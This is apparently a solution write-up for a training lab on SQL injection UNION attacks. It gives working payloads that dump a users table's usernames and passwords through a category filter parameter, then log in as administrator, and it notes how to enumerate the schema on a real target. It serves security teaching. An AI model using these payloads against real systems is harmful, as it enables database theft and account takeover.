# Lab 05 — SQL injection UNION attack, retrieving data from other tables

> **Practitioner** · [Official lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

**Entry point:** `GET /filter?category=`

## Goal

Dump the `users` table via UNION and log in as `administrator`.

## Solution

1. Confirm the query returns **2 columns** and that **both accept text**:

```
'+UNION+SELECT+'a','a'--
```

2. The lab description tells you there is a `users` table with
   `username` and `password` columns. Dump it:

```
'+UNION+SELECT+username,password+FROM+users--
```

The response lists every user with their password.

3. Find the `administrator` row, log in with the leaked password — lab solved.

## Notes

`users` is the conventional guess, but on a real target you would enumerate
schema objects first (see labs 09/10 for `information_schema` / `all_tables`).
